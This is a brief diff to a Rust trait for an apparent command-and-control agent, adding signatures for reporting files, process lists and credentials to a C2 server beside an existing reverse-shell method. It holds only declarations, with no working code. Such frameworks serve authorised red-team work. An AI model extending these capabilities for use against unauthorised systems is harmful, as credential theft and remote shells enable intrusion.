@@ -40,5 +40,10 @@ pub trait Agent: Send + Sync {
         name: String,
         future: SubtaskFuture,
     ) -> Result<(), String>;
+
+    // Capability methods
     fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String>;
+    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String>;
+    fn report_process_list(&self, req: c2::ReportProcessListRequest) -> Result<c2::ReportProcessListResponse, String>;
+    fn report_credential(&self, req: c2::ReportCredentialRequest) -> Result<c2::ReportCredentialResponse, String>;
 }
